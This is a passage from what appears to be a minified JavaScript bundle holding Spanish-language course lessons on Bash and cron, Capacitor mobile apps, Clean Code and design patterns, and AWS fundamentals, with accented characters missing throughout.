4. Ordenamos alfabticamente.
5. Quitamos los duplicados.
**Visin Senior:** Has procesado miles de registros en una sola lnea de comando.

---

### Desafo Senior:
Imagina que te pasan un archivo de configuracin de 5,000 lneas y tienes que cambiar el puerto \`8080\` por \`9000\` en todos lados menos en las lneas que estn comentadas con \`#\`. Cmo lo haras con \`sed\`?
`,completed:!1},{id:"bash-11-cron-devops",title:"Cron Jobs y Automatizacin DevOps",level:"senior",content:`# Leccin 11: Cron Jobs y Automatizacin DevOps

El corazn de un servidor es su capacidad de ejecutar tareas sin supervisin humana.

## 1. Cron Jobs a Fondo
Usa \`crontab -e\` para editar tus tareas.
*   \`0 3 * * * /path/to/backup.sh\`: Ejecuta el backup todos los das a las 3:00 AM.
*   **Regla Senior:** Redirige siempre la salida de tus cron jobs a un archivo de log:
    \`0 3 * * * /path/to/script.sh >> /var/log/cron_resumen.log 2>&1\`

## 2. Automatizacin DevOps (CI/CD)
Los archivos de configuracin de GitHub Actions o GitLab CI usan Bash por debajo.
*   **Scripts de despliegue:** Scripts que detienen contenedores viejos, descargan la nueva imagen de Docker y encienden los nuevos.
*   **Health Checks:** Scripts que hacen \`curl\` a tu servidor y, si no responde, reinician el servicio automticamente.

## 3. Uso de \`rsync\` para despliegues rpidos
En lugar de copiar todo, \`rsync\` solo enva los archivos que cambiaron. Es la base de muchos sistemas de deploy profesionales.

---

### Caso Real Senior:
Diseaste un script que detecta si el disco duro est al 90% de capacidad y borra automticamente los logs ms viejos de 30 das para evitar que el servidor se congele.
`,completed:!1},{id:"bash-11-sysadmin-cron",title:"Administracin de Sistemas y Redes",level:"senior",content:`# Leccin 11: Administracin de Sistemas y Redes

Ms all de los archivos, un Senior domina el sistema operativo y la red desde la terminal.

## 1. Tareas Programadas (\`Cron\`)
\`Crontab\` es la herramienta que le dice al sistema: "Ejecuta este script todos los lunes a las 3 AM".
*   Sintaxis: \`* * * * * comando\` (Minuto Hora Da Mes Semana).
*   **Caso Senior:** Backup de la base de datos de produccin cada medianoche sin intervencin humana.

## 2. Gestin de Procesos
*   \`top\` / \`htop\`: Ver qu aplicaciones estn consumiendo toda la RAM/CPU.
*   \`kill -9 PID\`: Forzar el cierre de un proceso que se qued colgado.
*   \`ps aux\`: Listar absolutamente todo lo que est corriendo en el servidor.

## 3. Redes y Debugging
*   \`ssh user@host\`: Conectarse de forma segura a un servidor remoto.
*   \`curl -I https://google.com\`: Ver los encabezados de respuesta de un sitio para saber por qu falla (debugging de APIs).
*   \`netstat -tuln\`: Ver qu puertos estn abiertos en tu servidor.

---

### Misin Senior:
Manejar un servidor "Headless" (sin monitor). Debes ser capaz de entrar por SSH, ver por qu la base de datos est lenta, matar procesos innecesarios y revisar los logs de red.

### Ejercicio 11:
Investiga cmo configuraras un \`cron\` para que borre el contenido de la carpeta \`/tmp\` cada domingo a las 11:59 PM.
`,completed:!1},{id:"bash-12-practica-senior",title:"Evaluacin Senior: Master de la Terminal",level:"senior",content:`# Evaluacin Senior: Master de la Terminal

Demuestra tu nivel arquitectnico y operativo resolviendo estos escenarios crticos.

---

## 1. El Desafo del Log Gigante (Sed/Awk)
**Escenario:** Tienes un archivo de logs de 10GB. Necesitas extraer todas las direcciones IP nicas que intentaron acceder al endpoint \`/admin\` y fallaron (Status 401).
*Consigna:* Describe los pasos y los comandos (usando \`grep\`, \`awk\`, \`sort\`, \`uniq\`) que usaras para obtener esa lista negra de IPs.

## 2. El Desafo de la Automatizacin Robusta
**Escenario:** Debes crear un script de despliegue que:
1. Haga un \`git pull\`.
2. Verifique si el comando anterior fue exitoso.
3. Si fall, enve un mail de error y se detenga.
4. Si funcion, reinicie el servicio de Node.js.
*Consigna:* Escribe el fragmento de Bash que maneje esa lgica de error (\`if [ $? -ne 0 ]; then ...\`).

## 3. Discusin Tcnica
*   Por qu un Senior prefiere \`ssh\` con llaves pblicas/privadas en lugar de contraseas?
*   Qu es un proceso "Zombie" en Linux y cmo lo detectaras?
*   Cundo usaras un lenguaje como Python en lugar de Bash para automatizar una tarea?

---

### Recordatorio Final:
Un verdadero Senior no es el que sabe ms comandos de memoria, sino el que sabe consultar el manual y combinar las herramientas existentes para construir soluciones indestructibles. 
`,completed:!1,isProject:!0}]},Ux={id:"capacitor-module",title:"Capacitor",description:"Convierte tus aplicaciones web en aplicaciones nativas para iOS y Android con una sola base de cdigo.",completed:!1,track:"Mobile",lessons:[{id:"capacitor-intro",title:"Qu es Capacitor?",level:"junior",content:`# Leccin 1: Qu es Capacitor?

Capacitor es un **runtime nativo multiplataforma** que te permite construir aplicaciones mviles nativas usando tecnologas web (HTML, CSS y JavaScript).

## 1. Por qu Capacitor?
A diferencia de alternativas como React Native o Flutter, Capacitor te permite:
*   Usar cualquier framework web (React, Vue, Angular) o incluso JS puro.
*   Acceder a APIs nativas (Cmara, GPS, Bluetooth) con una sintaxis simple.
*   Mantener una sola base de cdigo para Web, iOS y Android.

## 2. Capacitor vs Cordova
Capacitor es el sucesor espiritual de Cordova, pero con mejoras clave:
*   **Gestin Nativa:** Los proyectos de iOS y Android son parte de tu repositorio, no artefactos generados.
*   **APIs Modernas:** Usa Promesas y async/await por defecto.
*   **Web First:** Tu app primero es una web app de calidad, y luego se "envuelve" para mvil.

## 3. El flujo de trabajo
1.  Construyes tu aplicacin web (ej: \`npm run build\`).
2.  Capacitor "copia" esos archivos en los proyectos nativos (\`npx cap copy\`).
3.  Abres el IDE nativo (Xcode o Android Studio) para compilar y ejecutar.

---
## Mini Ejercicio
Si ya tienes una aplicacin en React, qu crees que sera lo ms difcil de adaptar para que funcione en un celular?
`,completed:!1},{id:"capacitor-setup",title:"Instalacin y Configuracin",level:"junior",content:`# Leccin 2: Instalacin y Configuracin

Configurar Capacitor en un proyecto existente es extremadamente sencillo.

## 1. Instalacin
Dentro de tu proyecto web, ejecuta:
\`\`\`bash
npm install @capacitor/core @capacitor/cli
\`\`\`

## 2. Inicializacin
Luego, inicializa Capacitor:
\`\`\`bash
npx cap init
\`\`\`
Te pedir el nombre de la app y un ID de paquete (ej: \`com.miproyecto.app\`).

## 3. Agregar plataformas
Para agregar iOS o Android, necesitas instalar los paquetes correspondientes:
\`\`\`bash
npm install @capacitor/android @capacitor/ios
npx cap add android
npx cap add ios
\`\`\`

## 4. Requisitos del sistema
Recuerda que para compilar necesitars:
*   **Android:** Android Studio y el SDK de Android.
*   **iOS:** macOS y Xcode.

---
## Mini Ejercicio
Intenta ejecutar \`npx cap init\` en una carpeta de prueba. Qu archivos nuevos se crean en la raz del proyecto?
`,completed:!1},{id:"capacitor-plugins",title:"Uso de Plugins Nativos",level:"semi-senior",content:`# Leccin 3: Uso de Plugins Nativos

La verdadera magia de Capacitor est en su ecosistema de plugins, que te dan acceso al hardware del dispositivo.

## 1. Ejemplo: La Cmara
Primero instalas el plugin:
\`\`\`bash
npm install @capacitor/camera
\`\`\`

## 2. Uso en el cdigo
Importas y usas como una funcin asncrona normal:
\`\`\`typescript
import { Camera, CameraResultType } from '@capacitor/camera';

const takePicture = async () => {
  const image = await Camera.getPhoto({
    quality: 90,
    allowEditing: true,
    resultType: CameraResultType.Uri
  });

  // La imagen est lista para mostrarse en un <img>
  const imageUrl = image.webPath;
};
\`\`\`

## 3. Permisos
Capacitor maneja los permisos por ti, pero debes declararlos en los archivos de configuracin nativos (\`AndroidManifest.xml\` para Android o \`Info.plist\` para iOS).

## 4. Toast y Notificaciones
Capacitor ofrece plugins oficiales para casi todo:
*   \`@capacitor/toast\`: Mensajes flotantes rpidos.
*   \`@capacitor/local-notifications\`: Notificaciones locales.
*   \`@capacitor/geolocation\`: Ubicacin por GPS.

---
## Ejercicio Prctico
Imagina que ests creando una app de Bitcora de Viajes. Qu 3 plugins de Capacitor seran indispensables y para qu los usaras?
`,completed:!1},{id:"capacitor-build",title:"Despliegue y Live Reload",level:"semi-senior",content:`# Leccin 4: Despliegue y Live Reload

Durante el desarrollo, no querrs reconstruir la app cada vez que cambies un botn.

## 1. El comando Sync
Cada vez que haces cambios en tu cdigo web y ejecutas un build, debes sincronizar con los proyectos nativos:
\`\`\`bash
npx cap sync
\`\`\`
Este comando hace un \`copy\` (copia archivos) y un \`update\` (instala dependencias nativas).

## 2. Live Reload
Puedes ejecutar tu app en el dispositivo real pero que cargue el cdigo desde tu servidor de desarrollo local:
\`\`\`bash
npx cap run android --livereload --external
\`\`\`
Esto es extremadamente productivo.

## 3. Generacin de Binarios
Finalmente, para publicar en las tiendas:
*   **Android:** Abre en Android Studio y selecciona \`Build > Generate Signed Bundle / APK\`.
*   **iOS:** Abre en Xcode y selecciona \`Product > Archive\`.

---
## Evaluacin Final
1. Cul es el comando que sincroniza los cambios web con los nativos?
2. Necesitas saber Java o Swift para usar plugins bsicos en Capacitor?
3. Qu herramienta de desarrollo es obligatoria para compilar apps de iOS?
`,completed:!1,isProject:!0}]},Bx={id:"clean-code",title:"Clean Code & SOLID",description:"Aprende a escribir cdigo profesional, legible y mantenible siguiendo los estndares ms altos de la industria.",completed:!1,lessons:[{id:"clean-code-01-nombres-correctos",title:"Nombres Correctos - El Arte de Llamar a las Cosas",level:"junior",content:`# Leccin 01: Nombres Correctos - El Arte de Llamar a las Cosas

Escribir cdigo limpio no es un lujo, es una necesidad. Como Junior, tu primer objetivo es que tu cdigo se lea como un libro en ingls (o espaol) bien escrito.

## 1. El nombre debe decir la intencin
No uses nombres genricos o misteriosos. El nombre de una variable debe responder: Por qu existe?, Qu hace? y Cmo se usa?

*   **Mal:** \`const d = 5; // das transcurridos\`
*   **Bien:** \`const diasTranscurridos = 5;\`

## 2. Evita la desinformacin
No llames \`listaUsuarios\` a algo que no es una lista (Array). Si es un solo usuario, llmalo \`usuario\`.

## 3. Usa nombres pronunciables y buscables
Si no puedes pronunciarlo en una reunin sin parecer que ests dando un cdigo secreto, est mal. 
*   **Mal:** \`const fnyr = new Date().getFullYear();\`
*   **Bien:** \`const aoActual = new Date().getFullYear();\`

## 4. Funciones: Verbos, no sustantivos
Las funciones hacen cosas. Sus nombres deben ser verbos.
*   **Mal:** \`function datos() { ... }\`
*   **Bien:** \`function obtenerDatosUsuario() { ... }\`

---

### Concepto Junior:
Escribe tu cdigo pensando que la persona que lo va a leer dentro de 6 meses es una persona violenta que sabe dnde vives. Esa persona podras ser t mismo!

### Ejercicio Mental 1:
Mira este nombre: \`const temp = 25;\`. Si estamos en una App de clima, es correcto? Y si estamos en una App de cocina? Cmo lo mejoraras en cada caso?
`,completed:!1},{id:"clean-code-02-funciones-y-dry",title:"Funciones Pequeas y el principio DRY",level:"junior",content:`# Leccin 02: Funciones Pequeas y el principio DRY

En el Clean Code, menos es ms. Una funcin gigante que hace 20 cosas es una pesadilla para testear y arreglar.

## 1. Haz una sola cosa (Single Responsibility)
Una funcin debe tener un solo propsito. Si tu funcin tiene un comentario que dice "Primero valida, luego guarda y despus enva el mail", entonces debe dividirse en 3 funciones.

## 2. Pocos parmetros
Lo ideal es que una funcin tenga 0, 1 o 2 parmetros. Si necesitas pasar 5 cosas, probablemente debas pasar un **objeto**.
*   **Mal:** \`function crearUsuario(nombre, edad, email, direccion, ciudad) { ... }\`
*   **Bien:** \`function crearUsuario(datosUsuario) { ... }\`

## 3. DRY: Don't Repeat Yourself (No te repitas)
Si copias y pegas un bloque de cdigo en dos lugares diferentes, ests creando una deuda tcnica. 
*   **Consecuencia:** Cuando quieras cambiar una lgica, tendrs que buscar todos los lugares donde la pegaste. Si te olvidas de uno, tendrs un bug.

## 4. Evita los efectos secundarios
Una funcin no debera modificar variables globales o externas sin que el programador se de cuenta. Debe ser predecible: le doy X, me devuelve Y.

---

### Misin Junior:
Cada vez que escribas un \`if\` muy largo o una funcin de ms de 20 lneas, pregntate: "Puedo extraer esto a una funcin pequea con un nombre descriptivo?".

### Ejercicio Mental 2:
Tienes dos funciones que calculan el precio final: una para Argentina (+21% IVA) y otra para Mxico (+16% IVA). El resto de la lgica (descuento, envo) es igual. Cmo aplicaras DRY aqu?
`,completed:!1},{id:"clean-code-03-errores-comunes",title:"Errores Comunes de Cdigo Sucio",level:"junior",content:`# Leccin 03: Errores Comunes de Cdigo Sucio

Para ser un pro, primero hay que dejar de cometer errores de novato. Vamos a cazar los sntomas del "Cdigo Oloroso" (Code Smells).

## 1. Comentarios obvios
No comentes lo que el cdigo ya dice. Si necesitas un comentario para explicar qu hace el cdigo, es que el cdigo no es lo suficientemente claro.
*   **Mal:** \`i++; // incrementa i en 1\`
*   **Bien:** (Simplemente el cdigo, o un mejor nombre de variable).
*   **Cundo s comentar:** Para explicar el "Por qu" de una decisin extraa, no el "Qu".

## 2. Cdigo Muerto
Funciones que nadie usa, variables declaradas por las dudas, o trozos de cdigo comentados "por si los necesito despus".
*   **Regla:** Si no se usa hoy, se borra. Para eso existe Git, para recuperar cosas viejas si hace falta.

## 3. Niveles de indentacin extremos (El cdigo flecha)
Evita tener \`if\` dentro de \`if\` dentro de \`for\` dentro de \`if\`. 
*   **Tcnica:** Usa **Guard Clauses** (Clusulas de guarda).
\`\`\`javascript
// Mal
function inscribir(estudiante) {
    if (estudiante != null) {
        if (estudiante.edad > 18) {
            // lgica larga...
        }
    }
}

// Bien (Clean)
function inscribir(estudiante) {
    if (estudiante == null) return;
    if (estudiante.edad <= 18) return;
    
    // lgica principal sin niveles extraos
}
\`\`\`

---

### Verdad Junior:
Tu cdigo no es para la computadora (ella entiende binario). Tu cdigo es para que **otros humanos** puedan mantenerlo.

### Ejercicio Prctico 3:
Busca en tu proyecto algn archivo con cdigo comentado que no se use. **Brralo**. Siente la paz interior.
`,completed:!1},{id:"clean-code-04-principios-solid",title:"Principios SOLID (Introduccin)",level:"semi-senior",content:`# Leccin 04: Principios SOLID (Introduccin)

Como Semi-Senior, ya no solo escribes cdigo legible, escribes cdigo **robusto**. El acrnimo SOLID son los 5 pilares de la arquitectura orientada a objetos (y funcional).

## 1. S: Single Responsibility (Responsabilidad nica)
Una clase o mdulo debe tener **una sola razn para cambiar**. Si tu archivo maneja la lgica de pagos Y adems genera el PDF del recibo, viola el principio S.

## 2. O: Open/Closed (Abierto/Cerrado)
El software debe estar abierto para su extensin, pero cerrado para su modificacin. 
*   **Idea:** Debes poder agregar nuevas funciones sin tener que abrir y cambiar el cdigo que ya funciona.

## 3. L: Liskov Substitution
Si tienes una clase \`Padre\` y una clase \`Hijo\`, deberas poder usar al \`Hijo\` en cualquier lugar donde uses al \`Padre\` sin que nada se rompa.

## 4. I: Interface Segregation
Es mejor tener muchas interfaces pequeas y especficas que una sola interfaz gigante y obligatoria. No obligues a nadie a depender de mtodos que no usa.

## 5. D: Dependency Inversion (Inversin de Dependencias)
No dependas de cosas concretas, depende de **abstracciones**. 
*   **Ejemplo:** Tu cdigo no debe depender de "MySQL", debe depender de una "Base de Datos". As, si cambias la tecnologa, tu lgica principal ni se entera.

---

### Lo que hace un Semi-Senior:
Aplica SOLID no como una ley religiosa, sino como una gua para evitar que el cdigo se vuelva un "fideo" imposible de desenredar.

### Ejercicio 4:
Si tienes una clase \`Animal\` con un mtodo \`volar()\`, y creas una subclase \`Perro\`. Viola el principio Liskov? Cmo lo arreglaras?
`,completed:!1},{id:"clean-code-05-refactor-y-errores",title:"Refactorear y Manejar Errores como un Pro",level:"semi-senior",content:`# Leccin 05: Refactorear y Manejar Errores como un Pro

Refactorear no es "reescribir todo". Es mejorar la estructura interna del cdigo sin cambiar su comportamiento externo.

## 1. Cundo refactorear
*   Cuando vas a agregar una nueva funcionalidad y el cdigo actual te molesta.
*   Cuando ves un "Code Smell" (olor a cdigo sucio).
*   **Regla de Boy Scout:** Deja el cdigo un poquito ms limpio de como lo encontraste.

## 2. Manejo de Errores Profesional
Como principiante usas \`try/catch\` para que la app no explote. Como Semi-Senior, los usas para dar informacin valiosa.
*   **No silencies errores:** Nunca hagas un \`catch(e) {}\`. Si ocurre un error, debes loguearlo o informar al usuario.
*   **Lanza errores con sentido:** \`throw new ValidationError('El email es obligatorio')\` es mucho mejor que \`throw new Error('Fall todo')\`.

## 3. El Tringulo de la Muerte
Usa objetos para devolver resultados exitosos o fallidos.
\`\`\`javascript
// Mal: devuelve null o undefined y obliga a mil ifs
const user = findUser(id); 

// Pro: Devuelve un objeto con estado
const { data, error, loading } = useUser(id);
\`\`\`

---

### Misin Semi-Senior:
La refactorizacin solo es segura si tienes **Tests**. Nunca refactorees a ciegas; primero asegura que tienes una red de seguridad que te avise si rompiste algo.

### Ejercicio 5:
Mira una funcin vieja tuya. Aplica la tcnica de **Extraer Funcin** (llevar un pedazo de lgica a una funcin nueva con nombre claro). Sigue funcionando todo?
`,completed:!1},{id:"clean-code-06-abstracciones",title:"Abstracciones - El equilibrio del poder",level:"semi-senior",content:`# Leccin 06: Abstracciones - El equilibrio del poder

Una **abstraccin** es ocultar detalles complejos detrs de una interfaz simple. Pero cuidado: una mala abstraccin es peor que no tener ninguna.

## 1. El peligro de la Abstraccin Prematura
Un error comn de los Semi-Senior es querer hacer todo "genrico" antes de tiempo. 
*   **Regla de Tres:** No hagas una abstraccin hasta que no hayas repetido el mismo cdigo al menos 3 veces.

## 2. Acoplamiento y Cohesin
*   **Acoplamiento:** Qu tan "pegadas" estn dos partes del cdigo. Queremos bajo acoplamiento (que se puedan separar fcil).
*   **Cohesin:** Qu tanto tienen que ver las cosas dentro de un mdulo. Queremos alta cohesin (que todo lo que est en \`AuthService\` sea realmente de Auth).

## 3. Composicin sobre Herencia
En lugar de crear jerarquas gigantes (\`Animal -> Mamifero -> Perro -> Caniche\`), prefiere componer comportamientos.
*   "Un perro **tiene** capacidad de ladrar", en lugar de "Un perro **es** un ladrador".

---

### Verdad de Arquitectura:
Duplicar cdigo es un poco feo, pero la abstraccin equivocada es un desastre que te va a perseguir por aos. 

### Ejercicio Mental 6:
Ests creando un botn que a veces tiene icono a la izquierda y a veces a la derecha. Creas un solo componente con 20 props opcionales (Abstraccin Gigante) o creas 3 componentes pequeitos que se combinan? Cul es ms fcil de mantener?
`,completed:!1},{id:"clean-code-07-practica-clean-code",title:"Clean Code & SOLID",level:"semi-senior",content:`# Ejercicios y Evaluacin: Clean Code & SOLID

Demuestra que escribes cdigo que tus compaeros amarn leer.

---

## Nivel Junior: Detective de Nombres
**Consigna:** Tienes el siguiente cdigo. Renombra las variables para que sean 100% claras.
\`\`\`javascript
function p(a, b) {
    let x = a.map(i => i.val * b);
    return x.reduce((s, v) => s + v, 0);
}
\`\`\`
*Pista:* \`a\` es una lista de productos, \`b\` es el porcentaje de impuesto. \`p\` calcula el total con impuestos.

---

## Nivel Semi-Senior: Refactor de Responsabilidad
**Consigna:** Tienes una funcin \`guardarYSubirFoto(archivo, usuarioId)\`. 
1. Valida que el archivo sea una imagen.
2. Cambia el tamao de la imagen.
3. Lo sube a AWS S3.
4. Guarda la URL en la base de datos de MongoDB.
5. Enva un log de xito a Datadog.

*Pregunta:* Cmo dividiras esta funcin aplicando el principio **S (Single Responsibility)**? Nombra las funciones o clases que crearas.

---

## Evaluacin de Principios
*   Explica con tus palabras qu significa que un cdigo est "Cerrado para la modificacin pero abierto para la extensin".
*   Qu es un **Code Smell** y por qu es importante detectarlos a tiempo?
*   Por qu se recomienda evitar el uso excesivo de comentarios explicativos?

---

### Resultado esperado:
No buscamos la solucin perfecta, sino un razonamiento que priorice la **legibilidad** y la **facilidad de cambio** a futuro. 
`,completed:!1,isProject:!0},{id:"clean-code-08-singleton-factory",title:"Creacionales - Singleton y Factory",level:"senior",content:`# Leccin 08: Creacionales - Singleton y Factory

En el nivel Senior, los Patrones de Diseo son soluciones estndar a problemas comunes. No son reglas, son herramientas para que tu cdigo sea ms flexible.

## 1. Patrn Singleton
Asegura que una clase tenga **una nica instancia** en toda la aplicacin y proporciona un punto de acceso global.
*   **Caso Real en JS/TS:** Una conexin a una Base de Datos o un servicio de Logging. No quieres abrir 100 conexiones al mismo tiempo.
*   **Ejemplo:**
\`\`\`typescript
class DatabaseConnection {
  private static instance: DatabaseConnection;
  private constructor() {} // Nadie puede hacer 'new' fuera de aqu

  public static getInstance(): DatabaseConnection {
    if (!DatabaseConnection.instance) {
      DatabaseConnection.instance = new DatabaseConnection();
    }
    return DatabaseConnection.instance;
  }
}
\`\`\`

## 2. Patrn Factory (Fbrica)
Define una interfaz para crear objetos, pero deja que las subclases decidan qu clase instanciar.
*   **Caso Real:** Un sistema que maneja diferentes tipos de notificaciones (Email, SMS, Push). El cdigo principal no debe saber cmo se crea cada una.
*   **Ventaja:** Si maana agregas "WhatsApp", no tocas la lgica de negocio, solo agregas una pieza a la fbrica.

---

### Visin Senior:
Un patrn mal aplicado es peor que no usar patrones. Usa un Singleton solo si es ESTRICTAMENTE necesario tener una sola instancia; abusar de l convierte tu cdigo en una maraa de variables globales difciles de testear.
`,completed:!1},{id:"clean-code-09-strategy-observer",title:"Comportamiento - Strategy y Observer",level:"senior",content:`# Leccin 09: Comportamiento - Strategy y Observer

Estos patrones permiten que tu cdigo sea dinmico y que diferentes partes del sistema reaccionen entre s sin estar "pegadas".

## 1. Patrn Strategy (Estrategia)
Permite definir una familia de algoritmos, poner cada uno en una clase separada y hacer que sus objetos sean intercambiables.
*   **Caso Real:** Diferentes mtodos de pago (Stripe, PayPal, Crypto).
*   **Implementacin:** Tu clase \`OrderProcessor\` recibe una "estrategia" de pago. No le importa si es PayPal o Stripe, solo sabe que tiene un mtodo \`.pay()\`.

## 2. Patrn Observer (Observador)
Define una relacin de uno a muchos: cuando un objeto cambia su estado, todos sus dependientes son notificados automticamente.
*   **Caso Real:** El estado de una compra. Cuando el paquete se mueve, la App de logstica, el usuario (va mail) y el sistema de inventario "observan" y reaccionan.
*   **En JavaScript:** Es la base de los eventos (\`addEventListener\`) y de cmo funcionan libreras como Redux o RxJS.

---

### Misin Senior:
Usa **Strategy** para eliminar \`if/else\` gigantes o \`switch\` que crecen cada vez que agregas una funcionalidad. Si tu cdigo tiene muchos "casos especiales", probablemente necesites una estrategia.
`,completed:!1},{id:"clean-code-10-patron-repository",title:"Persistencia - El Patrn Repository",level:"senior",content:`# Leccin 10: Persistencia - El Patrn Repository

El patrn **Repository** es fundamental para separar la lgica de negocio de la infraestructura (la base de datos).

## 1. El concepto
Un Repositorio se comporta como una coleccin de objetos en memoria. El resto de la App le pide cosas al Repositorio, y este sabe cmo buscarlas en la DB.

## 2. Por qu es vital para Seniors
*   **Independencia total:** Si decides cambiar de MongoDB a PostgreSQL, el \`Service\` que usa el repositorio no cambia ni una lnea.
*   **Testing:** Puedes crear un \`MockRepository\` que devuelva datos fijos para tus tests sin necesidad de levantar una base de datos real.

## 3. Ejemplo en TypeScript
\`\`\`typescript
interface UserRepository {
  findById(id: string): Promise<User>;
  save(user: User): Promise<void>;
}

// Implementacin concreta
class MongoUserRepository implements UserRepository {
  async findById(id: string) { /* Lgica de MongoDB */ }
  async save(user: User) { /* Lgica de MongoDB */ }
}
\`\`\`

---

### Verdad Tcnica:
Muchos desarrolladores dicen "Nunca voy a cambiar mi base de datos". Pero el patrn Repository te salva tambin cuando quieres agregar una capa de **Cach** o cuando necesitas hacer migraciones complejas. Es flexibilidad pura.
`,completed:!1},{id:"clean-code-11-practica-senior",title:"Ejercicios Senior: Patrones de Diseo en Accin",level:"senior",content:`# Ejercicios Senior: Patrones de Diseo en Accin

Demuestra tu nivel arquitectnico resolviendo estos escenarios de la vida real.

---

## 1. El Dilema del Pago (Strategy)
**Escenario:** Tienes una aplicacin de E-commerce. Debes soportar pagos con Tarjeta, PayPal y Transferencia Bancaria. Cada uno tiene comisiones y pasos distintos.
*   **Desafo:** Crea la estructura de clases usando el patrn **Strategy** para que agregar un cuarto mtodo de pago no requiera modificar la clase principal de \`Orden\`.

## 2. El Log Centralizado (Singleton)
**Escenario:** Diferentes servicios de tu aplicacin (Auth, Payment, Inventory) necesitan escribir en el mismo archivo de log de forma ordenada.
*   **Desafo:** Implementa un \`Logger\` usando **Singleton**. Cmo aseguraras que dos servicios no intenten "instanciar" el logger al mismo tiempo en un entorno asincrnico?

## 3. Notificaciones Multi-canal (Factory)
**Escenario:** El sistema debe enviar avisos. Si el usuario es VIP, se enva SMS; si es normal, Email.
*   **Desafo:** Disea una \`NotificationFactory\`. Qu interfaces definiras para que el cdigo que pide la notificacin no sepa si se est enviando un SMS o un Mail?

---

### Criterio Senior:
No evaluamos si el cdigo compila (eso lo hace la computadora). Evaluamos si el diseo permite que el sistema crezca sin volverse un caos de dependencias. 
`,completed:!1,isProject:!0}]},Vx={id:"cloud-computing",title:"Cloud Computing Fundamentals",description:"Aprende a desplegar y gestionar aplicaciones en la nube con AWS.",completed:!1,track:"Herramientas Esenciales",lessons:[{id:"cloud-01-fundamentos",title:"Fundamentos de Cloud Computing",level:"junior",content:`# Leccin 1: Fundamentos de Cloud Computing

La "nube" no es ms que la computadora de otra persona. Alquilada.

## 1. Qu es Cloud Computing?
Es el modelo de consumir recursos de IT (servidores, bases de datos, almacenamiento) a travs de internet, pagando solo por lo que usas (Pay-as-you-go).
*   **Antes (On-Premise):** Comprabas servidores, pagabas electricidad, aire acondicionado, admin de sistemas.
*   **Ahora (Cloud):** Haces clic y tienes un supercomputador en segundos.

## 2. Modelos de Servicio (La Pizza as a Service)
*   **IaaS (Infrastructure as a Service):** Te alquilan la cocina y el horno. T traes la masa, el queso y cocinas.
    *   Ej: Amazon EC2, Google Compute Engine. VM (Virtual Machines).
    *   *Control:* Alto. *Responsabilidad:* Alta (instalar OS, parches).
*   **PaaS (Platform as a Service):** Te alquilan la cocina, el horno y te dan la masa lista. T pones los ingredientes.
    *   Ej: Heroku, AWS Elastic Beanstalk, Google App Engine.
    *   *Control:* Medio. *Responsabilidad:* Media (solo tu cdigo).
*   **SaaS (Software as a Service):** Te traen la pizza hecha a la mesa.
    *   Ej: Gmail, Salesforce, Dropbox, Netflix.
    *   *Control:* Bajo. *Responsabilidad:* Ninguna (solo usar).

## 3. Tipos de Nube
*   **Pblica:** AWS, Azure, Google. Compartes hardware (aislado lgicamente) con otros clientes. Barata y elstica.
*   **Privada:** Servidores dedicados solo para ti. Ms seguridad, ms caro, menos elstica. Para bancos o gobiernos.
*   **Hbrida:** Usas tu datacenter privado para datos sensibles y la nube pblica para cuando explota el trfico.

---

### Misin Junior:
Investiga el concepto de "CapEx vs OpEx". Por qu las empresas prefieren pasar de Capital Expenditure (Invertir millones en hardware antes de empezar) a Operational Expenditure (Pagar mensualmente por uso)?
`,completed:!1},{id:"cloud-02-proveedores",title:"Los Gigantes (AWS, Azure, GCP)",level:"junior",content:`# Leccin 2: Los Gigantes (AWS, Azure, GCP)

Hay muchos proveedores, pero 3 dominan el mundo.

## 1. AWS (Amazon Web Services)
*   **El Rey:** Lder indiscutible de mercado. Naci en 2006.
*   **Filosofa:** Tiene servicios para TODO. Curva de aprendizaje empinada, pero es el estndar de la industria.
*   **Servicios Clave:** EC2 (VMs), S3 (Storage), RDS (Bases de datos).

## 2. Microsoft Azure
*   **La Corporacin:** Fuerte en empresas que ya usan Windows/Office.
*   **Ventaja:** Mejor integracin con Active Directory, Windows Server y entornos corporativos.
*   **Servicios Clave:** Azure Virtual Machines, Blob Storage, Azure SQL Database.

## 3. Google Cloud Platform (GCP)
*   **El Innovador:** Naci de la infraestructura interna de Google.
*   **Fuerte en:** Big Data, Machine Learning y Contenedores (Kubernetes naci aqu).
*   **Servicios Clave:** Compute Engine, Cloud Storage, BigQuery.

## Comparativa Rpida
| Concepto | AWS | Azure | GCP |
| :--- | :--- | :--- | :--- |
| Mquina Virtual | EC2 | Virtual Machine | Compute Engine |
| Storage Objetos | S3 | Blob Storage | Cloud Storage |
| Kubernetes | EKS | AKS | GKE |
| Serverless | Lambda | Azure Functions | Cloud Functions |

---

### Misin Junior:
Crea una cuenta gratuita ("Free Tier") en AWS o Google Cloud. Te pedirn tarjeta de crdito (es normal, no cobran si te mantienes en los lmites gratis).
AWS ofrece 750 horas de EC2 micro gratis al mes por un ao.
`,completed:!1},{id:"cloud-03-fundamentos-aws",title:"Fundamentos AWS (EC2, S3, IAM)",level:"junior",content:`# Leccin 3: Fundamentos AWS (EC2, S3, IAM)

Aprender AWS es aprender el vocabulario de la nube.

## 1. Regiones y Zonas de Disponibilidad (Availability Zones - AZ)
*   **Regin:** rea geogrfica fsica (ej: \`us-east-1\` N. Virginia, \`sa-east-1\` So Paulo).
*   **AZ:** Un datacenter (o varios) dentro de una regin. \`us-east-1a\`, \`us-east-1b\`. Estn aislados entre s (distinta electricidad, inundaciones) pero conectados por fibra ultrarpida.
*   *Concepto Clave:* Si quieres que tu app no se caiga nunca, despliega en mltiples AZ.

## 2. EC2 (Elastic Compute Cloud) - IaaS
Son tus servidores virtuales.
*   **Instance Type:** Tamao de la VM. \`t2.micro\` (1 CPU, 1GB RAM) es la gratis. \`c5.4xlarge\` (16 CPU, 32GB RAM) es para procesar duro.
*   **AMI (Amazon Machine Image):** El sistema operativo base (Ubuntu, Linux 2, Windows).

## 3. S3 (Simple Storage Service) - Storage
Almacenamiento de objetos. Infinito.
*   **Buckets:** Contenedores de archivos (como carpetas raz). Los nombres son globales (nicos en todo el mundo).
*   **Objetos:** Archivos.
*   **Durabilidad:** 99.999999999% (11 nueves). Es casi imposible perder un dato aqu.

## 4. IAM (Identity and Access Management) - Seguridad
El portero de la discoteca.
*   **Usuarios:** Personas (T).
*   **Roles:** Sombreros que se ponen los servicios (ej: Una EC2 tiene permiso de leer S3).
*   **Policies:** Documentos JSON que dicen qu se puede hacer.
    *   *Regla de Oro:* NUNCA uses la cuenta "Root" (email principal) para trabajar da a da. Crea un usuario IAM con permisos de Admin.

---

### Misin Junior:
1. Entra a la consola de AWS.
2. Ve a IAM y crea un usuario llamado \`admin-junior\`.
